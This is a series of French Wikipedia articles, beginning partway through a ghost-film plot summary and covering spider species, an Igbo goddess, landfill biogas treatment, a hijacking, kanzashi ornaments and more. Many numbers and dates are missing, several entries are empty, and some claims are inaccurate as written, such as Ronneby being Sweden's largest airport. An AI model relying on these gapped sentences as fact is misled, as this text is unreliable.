Le fantôme s'éveille alors dans une plaine vierge, c'est bien le même lieu, mais au temps de la conquête de l'Ouest. Un homme plante des piquets (démonstration concrète de l'importance du geste dénié par le philosophe en chambre : pour assurer l'avenir des siens, il enclôt son lot. La famille du colon arrive en chariot couvert et s'installe. Leur vie s'écoule, tranquille et pieuse. Ils font des projets d'avenir. Le fantôme observe la cadette de la famille étrangement en train de fredonner la chanson qu'il a écrit. Et voici qu'elle rédige une note sur une page de cahier déchirée ... et la cache sous une pierre. Mais des indiens lancent une attaque et tuent la famille de colons. Tout cela n'aura abouti qu'à la destruction. Le fantôme assiste à la décomposition graduelle des corps criblés de flèches dans la prairie. Il va retourner la pierre où la fillette a caché sa feuille manuscrite.
Le temps passe, le voici de nouveau à l'époque qu'il a vécu dans ce lieu, en couple et amoureux. Le fantôme se retrouve face à lui-même, vivant et en compagnie de sa femme. Il assiste en spectateur à la première visite de la maison, à la découverte du piano que la bailleuse, nommée Linda, leur abandonne volontiers : il a toujours été là. Il se revoit composer sa chanson triste sur ce piano. En regardant le couple, il redécouvre de minuscules détails de leur vie, auxquels il n'avait pas prêté suffisamment d'attention. Cette fois, il écoute ce que lui disait sa jeune femme qui se plaignait d'être trop seule et de devoir prendre toutes les décisions du couple. Elle voulait quitter cette maison, mais son mari ne pouvait s'y résoudre et affirmait, en opposition avec sa femme, qu'elle contenait la somme de leurs souvenirs communs. La nuit précédant sa mort, il dit à sa femme qu'il est prêt à déménager. Pétrifié par la certitude de retourner à sa désespérante solitude, le fantôme s'effondre sur le siège du piano dont il frappe les touches, causant le bruit qui avait alarmé le couple au début du film. Plus tard, au moment où elle déménage enfin, le fantôme se revoit fantôme d'avant, en train de regarder par la fenêtre sa femme partir, un fantôme plus jeune en somme et ignorant de sa présence autant que l'ignorent les vivants, il est une double version de lui-même. Il retourne de nouveau à la fissure où sa femme a caché sa note manuscrite ; et voici qu'il finit par l'atteindre. Au moment où, enfin, il l'ouvre et la lit, le drap s'effondre au sol : il s'évanouit à son tour, comme le fantôme amnésique l'avait fait, puisqu'il a enfin retrouvé la présence spirituelle de sa bien-aimée. S'ouvre alors, logiquement, un temps autre où la hantise de la maison aura pris fin.
Sortie.
Accueil critique.
Le film reçoit dans l'ensemble de bons échos.
"Critiques positives" 
"Critiques négatives" 

</doc>
<doc id="10578082" url="https://fr.wikipedia.org/wiki?curid=10578082" title="Heteropoda tokarensis">
Heteropoda tokarensis



</doc>
<doc id="10578083" url="https://fr.wikipedia.org/wiki?curid=10578083" title="Heteropoda andamanensis">
Heteropoda andamanensis



</doc>
<doc id="10578085" url="https://fr.wikipedia.org/wiki?curid=10578085" title="Heteropoda nicobarensis">
Heteropoda nicobarensis



</doc>
<doc id="10578089" url="https://fr.wikipedia.org/wiki?curid=10578089" title="Heteropoda hainanensis">
Heteropoda hainanensis

Heteropoda hainanensis est une espèce d'araignées aranéomorphes de la famille des Sparassidae.
Distribution.
Cette espèce est endémique de Hainan en Chine. Elle se rencontre dans les xians de Lingshui, Changjiang et Qiongzhong.
Description.
Le mâle holotype mesure et la femelle paratype .
Systématique et taxinomie.
Cette espèce a été décrite par Korai et Jäger en 2024.
Heteropoda hainanensis Korai &amp; Jäger, 2024 étant préoccupé par Heteropoda hainanensis Li, 1991, un nom de remplacement est nécessaire.
Étymologie.
Son nom d'espèce, composé de "hainan" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, Hainan.

</doc>
<doc id="10578090" url="https://fr.wikipedia.org/wiki?curid=10578090" title="Heteropoda shimen">
Heteropoda shimen



</doc>
<doc id="10578091" url="https://fr.wikipedia.org/wiki?curid=10578091" title="Heteropoda venatoria emarginata">
Heteropoda venatoria emarginata



</doc>
<doc id="10578092" url="https://fr.wikipedia.org/wiki?curid=10578092" title="Heteropoda venatoria foveolata">
Heteropoda venatoria foveolata



</doc>
<doc id="10578095" url="https://fr.wikipedia.org/wiki?curid=10578095" title="Heteropoda venatoria pseudomarginata">
Heteropoda venatoria pseudomarginata



</doc>
<doc id="10578097" url="https://fr.wikipedia.org/wiki?curid=10578097" title="Pebibyte">
Pebibyte



</doc>
<doc id="10578106" url="https://fr.wikipedia.org/wiki?curid=10578106" title="Ala (déesse)">
Ala (déesse)

Ala (nom signifiant « Terre »), également appelée Ani, Ana, Ale ou Ali selon les dialectes, est l'une des divinités les plus importantes de la mythologie igbo. Fille du dieu suprême , elle est à la fois déesse de la Terre, de la fertilité, de la justice, de la morale et des ancêtres.
Elle règne sur le monde des ancêtres, c'est-à-dire sous terre. Les Igbos considèrent que les morts enterrés sont ensuite transformés en terre et donc accueillis dans le corps de la déesse. Elle est à l'origine de la sacralisation de la terre. Elle est notamment vénérée lors de la fête du Yam, une fête de la moisson de l'igname.
En tant que déesse de la justice et de la morale, Ala est celle qui décide des tabous. Elle veille aux droits et coutumes igbos, qui sont désignés sous le terme « Omenala ».
À l'origine de la fertilité de la terre, elle est aussi responsable de la fécondité. Elle protège ainsi à la fois les mères et les enfants. Ala est d'ailleurs souvent représentée accompagnée d'un enfant. Elle est même considérée comme la mère des Igbos.
Le python est son animal messager. La présence de ce serpent est donc vu comme un bon signe. Le croissant de lune est un autre élément associé à Ala.

</doc>
<doc id="10578107" url="https://fr.wikipedia.org/wiki?curid=10578107" title="1138 en santé et médecine">
1138 en santé et médecine

Cet article présente les faits marquants de l'année 1138 en santé et médecine.

</doc>
<doc id="10578113" url="https://fr.wikipedia.org/wiki?curid=10578113" title="Bührer (tracteur)">
Bührer (tracteur)

Bührer est fabricant et une marque de tracteurs suisse fondé en 1927 dont le siège est à Hinwil.
Historique.
Elle a été fondée par Fritz Bührer.
Fritz Bührer décède en 1974. L'entreprise est reprise en 1979 par la famille Mägerle qui la dirige encore.
Cette marque connu une popularité supplémentaire en 2013 lorsque son modèle Bührer 6135 A fut choisi par Giants Software comme modèle initial pour les joueurs de Farming Simulator 2013.
Clients.
Le BD 4 Trak 4x2 a servi dans l'armée suisse à 45 exemplaires de 1948 à 1992.
Le Bührer Super DD 4 Trak 4x2 a servi dans l'armée suisse à 30 exemplaires de 1952 à 1992 dans l'infanterie, le génie, la DCA, la protection aérienne et les troupes sanitaires.

</doc>
<doc id="10578127" url="https://fr.wikipedia.org/wiki?curid=10578127" title="Mosquée Sidi Ali Ben Ziyad">
Mosquée Sidi Ali Ben Ziyad

La mosquée Sidi Ali Ben Ziyad () est une ancienne mosquée tunisienne, qui n'existe plus de nos jours et qui était située à l'ouest de la médina de Tunis.
Localisation.
Elle se trouvait sur la rue Sidi Ben Ziyad, derrière le Dar El Bey.
Étymologie.
Elle tire son nom du saint homme Sidi Ali Ben Ziyad, jurisconsulte ifriqiyen et grand imam malikite.
Histoire.
Selon l'historien Mohamed Belkhodja, Sidi Ali Ben Ziyad, mort en 799 (183 de l'hégire), est enterré dans cet édifice, ce qui indique que la mosquée a existé dès le .

</doc>
<doc id="10578129" url="https://fr.wikipedia.org/wiki?curid=10578129" title="Aéroport de Ronneby">
Aéroport de Ronneby

L'aéroport de Ronneby (Kallinge) est situé à environ de Ronneby, en Suède et à de Karlshamn et à de Karlskrona.
L'aéroport se trouve dans le Sud de la Suède (Götaland). Il est le plus grand aéroport de Suède. L'aéroport a accueilli en 2011.
Situation.
Usage militaire.
C'est la base du Blekinge Wing (en suédois : Blekinge flygflottilj), ou F 17 Kallinge, volant sur Saab JAS 39 Gripen. Du 3 escadron d'hélicoptères sur NHIndustries NH90.
Compagnies aériennes et destinations.
Actualisé le 27/02/2023

</doc>
<doc id="10578131" url="https://fr.wikipedia.org/wiki?curid=10578131" title="La La Land (bande originale)">
La La Land (bande originale)

La La Land: Original Motion Picture Soundtrack est la bande originale de la comédie musicale "La La Land", réalisée par Damien Chazelle et sortie en 2016. L'album est distribué par Interscope Records.
Composées par Justin Hurwitz, la musique du film ainsi que la chanson "City of Stars" reçoivent les deux Oscars de leurs catégories respectives le lors de la cérémonie des Oscars.
Composition.
Les chansons et la bande originale de "La La Land" ont été composées et orchestrées par Justin Hurwitz, camarade de Damien Chazelle à l'université Harvard, qui a également travaillé sur ses deux premiers films. Les paroles des chansons ont été écrites par Pasek and Paul, sauf "Start a Fire", écrite par John Legend, Hurwitz, Marius de Vries et Angélique Cinelu.
Le "La La Land Jazz Ensemble" qui interprète certains thèmes est composé de (kb), Kevin Axt, (tp), Peter Erskine (d), (s), (tb), (s), et Graham Dechter (eg).

</doc>
<doc id="10578136" url="https://fr.wikipedia.org/wiki?curid=10578136" title="Java (municipalité)">
Java (municipalité)



</doc>
<doc id="10578156" url="https://fr.wikipedia.org/wiki?curid=10578156" title="Distance (théorie des graphes)">
Distance (théorie des graphes)

En théorie des graphes, la distance entre deux nœuds d'un graphe est la longueur d'un plus court chemin entre ces deux nœuds. La longueur d'un chemin est sa longueur en nombre d'arêtes. Pour un graphe pondéré c'est la somme des poids des arêtes empruntées. Pour les graphes non orientés, c'est une distance au sens mathématique, tandis que pour les graphes orientés elle ne vérifie pas la propriété de symétrie.
Cette notion permet entre autres de définir le diamètre et le rayon d'un graphe. 

</doc>
<doc id="10578194" url="https://fr.wikipedia.org/wiki?curid=10578194" title="Le Bataillon en folie">
Le Bataillon en folie

Le Bataillon en folie (titre original : "") est un film italien réalisé par Salvatore Samperi et sorti en 1976, inspiré de la bande dessinée "Sturmtruppen" de Bonvi.
Synopsis.
Un bataillon se prépare à une guerre dont personne ne connaît les causes.

</doc>
<doc id="10578203" url="https://fr.wikipedia.org/wiki?curid=10578203" title="Michael Blackledge">
Michael Blackledge

Michael Blackledge est un concepteur américain de jeu vidéo né en 1978 à Santa Barbara en Californie. Il a travaillé pour les sociétés Electronic Arts, Sony Interactive Entertainment, Microsoft, Hasbro Interactive et Insomniac Games. 

</doc>
<doc id="10578211" url="https://fr.wikipedia.org/wiki?curid=10578211" title="Mosquée maure de Kapurthala">
Mosquée maure de Kapurthala

La Mosquée maure est une mosquée située à Kapurthala en Inde, dans l'État du Pendjab.
Elle est modelée sur les lignes de la Koutoubia de Marrakech, au Maroc, et a été commandée par Maharaja Jagatjit Singh, le dernier souverain de Kapurthala. La ville de Kapurthala était alors la capitale de la principauté de Kapurthala, connue sous le nom de « Paris du Pendjab » et la mosquée était considérée comme l'une des meilleures d'Asie du Sud-Est. 
Elle est un monument national protégé par l'Archaeological Survey of India.

</doc>
<doc id="10578223" url="https://fr.wikipedia.org/wiki?curid=10578223" title="Platyrhynque à ailes rousses">
Platyrhynque à ailes rousses

Le Platyrhynque à ailes rousses ("Platyrinchus leucoryphus"), aussi appelé Bec-plat à ailes rousses, est une espèce de passereaux de la famille des Tyrannidae.
Répartition et habitat.
Cet oiseau vit à travers le sud de la forêt Atlantique (sud-est du Brésil, est du Paraguay et la selva misionera).

</doc>
<doc id="10578225" url="https://fr.wikipedia.org/wiki?curid=10578225" title="Giannotti">
Giannotti

Patronymes.
Giannotti est un patronyme d'origine italienne porté notamment par :

</doc>
<doc id="10578226" url="https://fr.wikipedia.org/wiki?curid=10578226" title="Teamsters Québec">
Teamsters Québec

Teamsters Québec est un syndicat ouvrier affilié à Teamsters Canada et à la Fédération des travailleurs du Québec qui regroupe plus de travailleurs dans la province. Les syndiqués de Teamsters Québec proviennent des secteurs de l'Alimentation, la Buanderie, la Cimenteries, l'Hôtellerie, l'Industrie pharmaceutique, l'Industrie manufacturière, la Livraison, la Restauration, du Textile et du vêtement et du Transports.
Locaux des Teamsters.
Section locale 931.
Le syndicat compte 1600 travailleurs syndiqués chez Purolator au Québec.

</doc>
<doc id="10578228" url="https://fr.wikipedia.org/wiki?curid=10578228" title="Platyrinchus leucoryphus">
Platyrinchus leucoryphus



</doc>
<doc id="10578229" url="https://fr.wikipedia.org/wiki?curid=10578229" title="Installation de stockage de déchets non dangereux">
Installation de stockage de déchets non dangereux

En France, une installation de stockage de déchets non dangereux (ISDND) (ex- ) est une installation classée pour la protection de l'environnement (ICPE) qui élimine des déchets non dangereux par dépôt ou enfouissement sur ou dans la terre.
Classement ICPE.
Les installations de stockage de déchets non dangereux sont concernées par la rubrique 2760-2 de la nomenclature des installations classées et sont soumises à autorisation préfectorale. Cette autorisation est délivrée sous la forme d'un arrêté préfectoral qui impose à l'exploitant le respect d'un certain nombre de prescriptions techniques qui visent à minimiser l'impact environnemental de l'installation et qui sont notamment issues de l'arrêté ministériel du .
Il est à noter que si les déchets stockés sont uniquement des déchets non dangereux inertes, les installations sont appelées (ISDI) et sont alors classées sous la rubrique 2760-3.
L'instruction de la demande d'autorisation d'exploiter ainsi que le contrôle du respect des prescriptions imposées est réalisé par l'inspection des installations classées.
Sécurisation environnementale.
Pour diminuer les risques de diffusion de polluants dans l'environnement (eau, air, sol, écosystèmes) des barrières d'étanchéités sont généralement imposées.
En France un Arrêté Ministériel du (mis à jour le ), impose la mise en place d’un système d’étanchéité en fond et flancs d’alvéoles d’installation de stockage de déchets (ISDND) ; il s'agit généralement d'une géomembrane généralement en polyéthylène haute densité (PEHD) considéré comme résistant et d'une grande inertie chimique
et biologique, en réalité composées de différents types de résines à bases de polyéthylène (PEHD ou PEBD ou PEBDL), auxquelles sont ajoutées divers additifs. La durée de vie ces membranes ne peut pas être évaluée précisément.
ISDND et méthane.
Plus les ISDND contiennent de matière organique, plus elles produisent (selon leur âge et le taux d'humidité de la décharge) spontanément du biogaz, qui contient notamment du méthane.
Ce gaz à effet de serre a longtemps été récupéré et brûlé ou le plus souvent relargué dans l'atmosphère et le milieu naturel. Dans le monde 10 millions de mètres cubes par heure de décharges seraient ainsi perdus dans l'atmosphère ou au mieux brûlés (équivalent de la consommation gazière annuelle d'un pays comme la France). Il peut être valorisé énergétiquement pour produire de la chaleur et/ou de l'électricité, de la vapeur ou de l'énergie mécanique sur place, ou injecté dans le réseau de gaz après transformation en biométhane (biogaz épuré).
Un frein et un verrou à la valorisation de ces biogaz en électricité était respectivement leur teneur en sulfure d’hydrogène (H2S) et leur teneur en "COVSi" (Composés Organiques Volatils du Silicium, plus communément dénommés siloxanes) qui forment des dépôts abrasifs dégradant prématurément les moteurs des génératrices d'électricité.
Avec le H2S, les siloxanes dégradent la rentabilité économique de la récupération du biogaz de décharge.
La teneur en COVSi des gaz de décharge et leur nature précise ont en outre longtemps été difficiles à analyser (jusque vers 2005) puis des analyses (élémentaire, par diffraction de rayons X, microcalorimétrie et microscopie électronique), y compris des COVSi ont précisé la nature des contaminants du gaz de décharge qui dégradent les moteurs.
Ces contaminants siliceux ont dans les années 2000 été étudiés en laboratoire pour les qui en sont la source.
On a aussi étudié le rôle du pH, des cations et du contexte biologique sur la dégradation d'huiles silicones. Les teneurs en COVSi de boues de stations d'épuration (STEP) et des biogaz qu'elles produisent ont aussi été étudiées grâce à une nouvelle méthode d’analyse des COVSi, méthode qui a conduit à démontrer que la nature des COVSi dépend beaucoup du type de déchets organiques impliqués dans la méthanisation. Une étude de 2008 porte sur la production et de la consommation des silicones et leur répartition en fin de vie selon les deux filières d’élimination.
Les performances de divers types de charbons actifs ont été comparées en laboratoire et "in situ" et de nouveaux procédés d'épuration des gaz de décharge ont émergé tels que la "Waga-box" ont été récemment (années 2010) mis au point permettant la production d'un biométhane pur à plus de 98% que l'on peut alors directement valoriser sur place ou injecter dans le réseau gazier. Cet outil, mis au point par une Start-Up iséroise (Waga-Energy, créée en 2015 à Meylan) combine une filtration sur membrane et une distillation cryogénique ; elle a été testée à Saint-Florentin dans l’Yonne (site Coved) puis à Troyes et à Saint-Maximin dans l’Oise sur 2 ISDND qui ont ainsi pu injecter dans le réseau du biométhane pur à plus de 98%. Des projets concernent au moins 2 autres centres de stockage du Loiret et de Meurthe-et-Moselle.
Comme il est généralement difficile de prélever des échantillons de biogaz en différents points représentatifs de la décharge, on cherche à se baser sur les caractéristiques physico-chimiques d’un dépôt (notamment son pouvoir méthanogène) pour prédire la qualité du biogaz qu'il produira (et donc pour dimensionner les besoins en épuration des COVSi et du H2S). Au début des années 2010, un réacteur de traitement gaz-liquide a été testé sur biogaz réel pour en apprécier les performances vis-à-vis de certains COVSi.
Des moyens de conjointement purifier le biogaz de ses siloxanes et de son H2S sont recherchés. Le transfert gaz-liquide dans des huiles et l'adsorption sur charbon actif semblent complémentaires : l'huile absorbant les fortes doses puis le charbon actif adsorbe les traces restantes. La physi-adsorption du H2S sur charbon actif en tissu pré-humidifié pouvant être régénéré un certain nombre de fois "in situ" (par chauffage électrique direct et mise en dépression du réacteur, sans besoin de haute température ou forte différence de pression) a aussi été étudiée.
Amiante.
Seuls les déchets d'amiante liés à des matériaux inertes (ex : amiante-ciment, terres amiantifères, agrégats d’enrobés contenant de l’amiante) peuvent être éliminés dans des installations de stockage de déchets non dangereux, à condition d'être uniquement entreposés dans des alvéoles spécifiques.
Les déchets amiantés non-inertes (ex : dalles vinyl-amiante) ou les déchets d’amiante non-liés (ex : déchets de flocage, équipements de désamiantage contaminés...) doivent être éliminés dans des installations de stockage de déchets dangereux (ISDD).

</doc>
<doc id="10578232" url="https://fr.wikipedia.org/wiki?curid=10578232" title="Décharge de classe 2">
Décharge de classe 2



</doc>
<doc id="10578234" url="https://fr.wikipedia.org/wiki?curid=10578234" title="Installations de stockage de déchets non dangereux">
Installations de stockage de déchets non dangereux



</doc>
<doc id="10578260" url="https://fr.wikipedia.org/wiki?curid=10578260" title="Publicité multi-locale">
Publicité multi-locale



</doc>
<doc id="10578265" url="https://fr.wikipedia.org/wiki?curid=10578265" title="Manduca wellingi">
Manduca wellingi

Manduca wellingi est une espèce de papillons de nuit de la famille des Sphingidae, de la sous-famille des Sphinginae et de la tribu des Sphingini.
Description.
L'espèce est similaire à "Manduca pellenia", mais est plus petite.

</doc>
<doc id="10578267" url="https://fr.wikipedia.org/wiki?curid=10578267" title="Vol British Airways 870">
Vol British Airways 870

Le vol British Airways 870 est un vol de la compagnie British Airways, assuré par un Vickers VC10, reliant l'aéroport de Dubaï à l'aéroport de Londres-Heathrow qui fut détourné le au départ de Dubaï par des terroristes palestiniens.
Déroulement.
Durant l'escale de l'avion à Dubaï, 4 terroristes déguisés en employés de l’aéroport quittent le salon des passagers et courent jusqu'à l'avion. Une fois à bord, ils se rendent compte de l’absence du commandant de bord. Le commandant, Jim Futcher, n'hésite pas et remonte à bord.
Le Vickers VC10 décolle de Dubaï avec 27 passagers et 8 employés de nettoyage de l'aéroport, qui se trouvaient à bord de l'avion lorsque les terroristes sont arrivés.
L'objectif premier des pirates de l'air étaient de se rendre à l'aéroport de Beyrouth, mais ils apprennent que les autorités libanaises ont fermé l'aéroport.
L'appareil met alors le cap sur l'aéroport de Tripoli, en Libye, afin de faire le plein de carburant, puis se rend à l'aéroport de Tunis, en Tunisie.
Une fois au sol, l'avion est immédiatement entouré par les forces de sécurité. Les pirates de l'air exigent alors la libération de sept terroristes incarcérés (deux en Égypte et cinq aux Pays-Bas). Les pirates de l'air donnent un délai de 24 heures, et menacent d'exécuter un otage toutes les deux heures une fois le délai dépassé. Aucune avancée ne s'étant produite durant ce délai, ils exécutent alors un des passagers.
D'intenses négociations ont alors lieu, et aboutissent à la libération des terroristes incarcérés, qui sont progressivement conduits auprès de l'appareil. Les pirates de l'air commencent alors à libérer plusieurs passagers. Une fois les sept terroristes libérés et amenés auprès de l'appareil, tous les passagers et la plupart des membres d'équipage sont relâchés.
À bord de l'appareil, il ne reste donc que les 11 terroristes, et 3 membres d'équipage (le commandant de bord, le copilote et le mécanicien navigant).
Les terroristes apprennent ensuite par la radio que leurs actions ont été condamnées par tous les gouvernements arabes, ainsi que par l'Organisation de libération de la Palestine.
Les terroristes demandent alors l'asile politique en Tunisie, mais celle-ci rejette leur demande. Les terroristes désemparés menacent alors de faire exploser l'appareil avec les otages. Le commandant de bord les convainc que s'ils mettent leurs menaces à exécution, le monde entier condamnera leurs actions.
Finalement, après 84 heures, les terroristes décident de se rendre.
Récompense.
Le commandant de bord, Jim Futcher, reçut la Médaille de la bravoure de la Reine pour sa gestion lors de ce détournement. Il était notamment retourné à bord en sachant que les pirates s’y trouvaient toujours.

</doc>
<doc id="10578271" url="https://fr.wikipedia.org/wiki?curid=10578271" title="Mosquée Maure de Kapurthala">
Mosquée Maure de Kapurthala



</doc>
<doc id="10578273" url="https://fr.wikipedia.org/wiki?curid=10578273" title="Dimitrije Popović">
Dimitrije Popović

Dimitrije Popović (en serbe cyrillique : ; né en 1738 à Veliki Bečkerek et mort en 1796 à Veliki Bečkerek) est un peintre serbe appartenant au mouvement baroque. Il a essentiellement travaillé en Voïvodine (aujourd'hui en Serbie) et en Slavonie (aujourd'hui en Croatie). On lui doit de nombreuses œuvres réalisées pour les églises de ces régions.
Dimitrije Popović s'inscrit dans la lignée d'autres peintres baroques comme Jakov et Zaharije Orfelin, Teodor Kračun ou Teodor Ilić Češljar.

</doc>
<doc id="10578278" url="https://fr.wikipedia.org/wiki?curid=10578278" title="Université virtuelle de Côte d'Ivoire">
Université virtuelle de Côte d'Ivoire

L’Université Virtuelle de Côte d'Ivoire (UVCI) est une université publique ivoirienne d'enseignement à distance, située à Abidjan. 
Créée par décret , l'université virtuelle est dotée d'un budget initial de 20 milliards de francs CFA, incluant également l'équipement des étudiants en ordinateurs et celui des universités publiques en Wi-Fi. 
Pour le gouvernement, cette université virtuelle doit pallier le déficit de l'enseignement universitaire en Côte d'Ivoire et la croissance importante du nombre d'étudiants. L'équipe enseignante est composée de douze groupes de professeurs, sélectionnés après appel à projets et mettant en place des formations en ligne ouverte à tous (Moocs).
L'Université Virtuelle a montré sa capacité à tisser des liens avec des organisations d'Union Européenne sur des sujets d'actualité et à prendre un leadership régional comme en témoigne la cérémonie qu'elle a organisée pour distribuer des ouvrages sur l'énergie solaire aux universités ivoiriennes. En partenariat avec des entreprises informatiques telles que: CISCO; Microsoft; Mediasoft Lafayette et Orange CI, elle offre des certifications professionnelles.
Missions.
Cette université a pour mission de :

</doc>
<doc id="10578284" url="https://fr.wikipedia.org/wiki?curid=10578284" title="Alma Bennett">
Alma Bennett

Alma Bennett, née "Alma Long", le à Seattle aux États-Unis, morte le à Los Angeles aux États-Unis, est une actrice américaine du cinéma muet.
Biographie.
Alma Bennett apparaît dans films entre 1915 et 1931. Elle est enterrée à à Los Angeles.
Vie privée.
Elle se marie à trois reprises : son premier mari est "Frederick Clayton Bennett" avec qui elle est mariée de 1924 à 1928, jusqu'au divorce. Puis elle épouse "Harry Spingler", en 1929. Celui-ci meurt en 1953. Enfin, son dernier mari est Blackie Whiteford, de 1954 à 1958.
Filmographie.
La filmographie d'Alma Bennett, comprend les films suivants : 

</doc>
<doc id="10578287" url="https://fr.wikipedia.org/wiki?curid=10578287" title="Barone">
Barone

Patronyme.
Barone est un patronyme d'origine italienne porté notamment par :

</doc>
<doc id="10578295" url="https://fr.wikipedia.org/wiki?curid=10578295" title="Manifesto (film)">
Manifesto (film)

Manifesto est une installation cinématographique multi écran germano-australienne écrite, produite et réalisée par Julian Rosefeldt et dont la première présentation a eu lieu en 2015.
Liminaire.
L'œuvre met en scène Cate Blanchett interprétant divers rôles dans treize différents manifestes.
La production a commencé en à Berlin, où elle a été tournée en douze jours. La première présentation a eu lieu à l"'Australian Centre for the Moving Image" du au . L'installation a été montrée également à Berlin au "Museum für Gegenwart", du au et à New York au Park Avenue Armory du au .
Une version cinématographique de 90 minutes est présentée en première au Festival du film de Sundance en .

</doc>
<doc id="10578309" url="https://fr.wikipedia.org/wiki?curid=10578309" title="2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-Nonadécaméthylheneicosane">
2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-Nonadécaméthylheneicosane

Le 2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-nonadécaméthylheneicosane est un alcane supérieur ramifié de formule semi-développée (CH3)2CH-[CH(CH3)]17-CH(CH3)2. C'est un isomère du tétracontane.
Les atomes de carbone C3 à C19 sauf C11 sont asymétriques et cette molécule possède un plan de symétrie passant par C11. Donc elle se présente sous la forme de nombreuses paires d'énantiomères et de nombreux composés méso.

</doc>
<doc id="10578326" url="https://fr.wikipedia.org/wiki?curid=10578326" title="Vent du Sud">
Vent du Sud

Vent du Sud (titre original : "South Wind") est un roman de l'écrivain écossais Norman Douglas (1868–1952) publié à Londres en .
Sujet.
L'action se déroule à Nepente, île imaginaire de la mer Méditerranée située entre la Sicile et l'Afrique du Nord; en réalité Nepente est une libre transposition de Capri, île tant aimée de Douglas où il vécut plusieurs années. Les personnages du roman font partie de la société qui fréquentait Capri à la Belle Époque. 
Le roman n'a pas de trame conductrice. Thomas Heard, évêque anglican de Bampopo en Afrique, arrive en bateau à Nepente pour rendre visite à sa cousine, Mrs Meadows, et faire une escale d'une douzaine de jours avant d'aller en Angleterre; mais il se trouve témoin d'un homicide: l'assassinat du méchant monsieur Muhlen ("de l'ivraie") précipité du haut d'une falaise. Plus qu'un simple roman policier, "Vent du Sud" est constitué d'une suite de conversations entre différents personnages à la manière d'un roman de Thomas Love Peacock. Le sujet principal de ces conversations est l'influence du sirocco, ce vent chaud qui modifie le comportement des hommes, surtout celui des Anglo-Saxons, les faisant tomber dans une espèce de folie face à la corruption des mœurs.
Éditions.
Le roman a été adapté pour la scène en 1923 à Londres par Isabelle C. Tippett.

</doc>
<doc id="10578333" url="https://fr.wikipedia.org/wiki?curid=10578333" title="Craig Mann">
Craig Mann

Craig Mann est un mixeur canadien né à Oakville (Ontario).
Biographie.
Après avoir obtenu son diplôme au à London (Ontario), il travaille pour Casablanca Sound pendant 5 ans au Canada avant de se voir offrir une possibilité d'exercer en Californie chez Todd-AO.

</doc>
<doc id="10578334" url="https://fr.wikipedia.org/wiki?curid=10578334" title="Frontières de l'Inde">
Frontières de l'Inde

Les frontières de l'Inde sont constituées de frontières terrestres et maritimes avec dix pays.
Frontières.
L'Inde a des frontières terrestres avec le Bhoutan, la Chine et avec le Népal. Elles sont contestées à plusieurs endroits dans l'Himalaya, notamment en ce qui concerne le conflit du Cachemire impliquant le Pakistan et la Chine concernant l'Azad Cachemire, le Gilgit-Baltistan, l'Aksai Chin et la vallée de Shaksgam ou encore avec le Népal concernant les territoires de Kalapani et de Susta.
Les frontières avec le Bangladesh, la Birmanie et le Pakistan sont à la fois terrestres et maritimes.
Les frontières avec l'Indonésie, les Maldives, le Sri Lanka et la Thaïlande sont exclusivement maritimes.
Enclaves et exclaves.
Il existe de nombreuses enclaves indo-bangladaises le long de la frontière entre l'Inde et le Bangladesh. Il existait même jusqu'en 2015 une enclave de troisième ordre : Dahala Khagrabari.
Historique.
Les frontières de l'Inde ont été négociées entre le Royaume-Uni, la Chine et le Tibet en 1914 lors de la convention de Simla.

</doc>
<doc id="10578361" url="https://fr.wikipedia.org/wiki?curid=10578361" title="Bonduelle (homonymie)">
Bonduelle (homonymie)

Bonduelle peut aussi désigner :

</doc>
<doc id="10578363" url="https://fr.wikipedia.org/wiki?curid=10578363" title="Jang Hoon">
Jang Hoon

Jang Hoon (장훈) est un réalisateur, producteur et monteur sud-coréen, né le dans le district de Jeongseon en Gangwon.

</doc>
<doc id="10578367" url="https://fr.wikipedia.org/wiki?curid=10578367" title="Bikini Chain Gang">
Bikini Chain Gang

Bikini Chain Gang est un film américain de série B écrit et réalisé par Fred Olen Ray, sorti directement en vidéo en 2005.
Synopsis.
Jessie ("Beverly Lynne") est serveuse dans un bar sordide ...

</doc>
<doc id="10578368" url="https://fr.wikipedia.org/wiki?curid=10578368" title="Kanzashi">
Kanzashi

Les sont des ornements traditionnels japonais, portés dans les cheveux pour agrémenter les coiffures des femmes. Certains modèles, comme les longues épingles en métal, pouvaient aussi être utilisés comme armes d’auto-défense.
Dans le monde occidental, le terme "kanzashi" désigne aussi les fleurs de tissu plié appelées au Japon "tsumami kanzashi", ou les techniques utilisées pour confectionner ces fleurs.
Histoire.
Les "kanzashi" apparaissent au Japon durant l’ère Jomon. À cette période, un fin bâton ou une épingle étaient supposés posséder des pouvoirs mystiques, et ils étaient utilisés pour éloigner de leur porteur les esprits maléfiques. Cette époque voit aussi l’apparition de l’ancêtre du peigne ornemental japonais.
Sous l’ère Nara, de nombreux éléments de la culture chinoise sont importés au Japon, comme le "zan" (qui s’écrit avec le même caractère chinois que "kanzashi") et d'autres ornements de coiffures. Au cours de la période Heian, le style traditionnel de coiffure évolue : alors que les cheveux étaient auparavant attachés en chignon sur le haut de la tête, ils sont désormais portés longs, et éventuellement attachés plus bas. Le terme "kanzashi" commence alors à être utilisé comme mot générique pour tous les ornements de coiffure, dont les peignes et les épingles. Puis, durant la période Azuchi-Momoyama, les coiffures changent à nouveau, passant de la , consistant à arborer de longs cheveux raides, à la plus grande variété de styles, désignée sous le nom de qui emploie de plus en plus d’ornements.
L’usage des" kanzashi "se généralise au cours de la période d'Edo, alors que les coiffures deviennent plus imposantes et plus complexes et arborent un plus grand nombre d’ornements. Les différents corps d’artisanat produisent des ouvrages finement décorés, dont certains peuvent être utilisés comme armes défensives (comme des épingles en métal sculpté). L’art des "kanzashi" culmine à la fin de cette période, avec la création de nombreux styles et modèles d’ornements.
De nos jours, les "kanzashi" sont le plus souvent portés avec des costumes traditionnels par les mariées, les femmes portant quotidiennement ces costumes, comme les geishas, les "tayū" et les "yujo", ou encore les pratiquantes de la cérémonie du thé japonaise et de l'ikebana. Cependant, certaines jeunes femmes japonaises souhaitant ajouter une touche d’élégance et d’originalité à des tenues professionnelles peuvent opter pour les "kanzashi".
Les types et styles de "kanzashi" possèdent chacun des significations, ce qui permet à un connaisseur de déduire de la coiffure d’une geisha son statut et d’autres informations, à partir des ornements choisis et de leurs positions. Les "maiko" (apprenties geishas) portent généralement des "kanzashi" plus nombreux et plus élaborés que leurs aînées et leurs coiffures suivent des traditions strictes, avec des motifs précis formés par ces ornements.
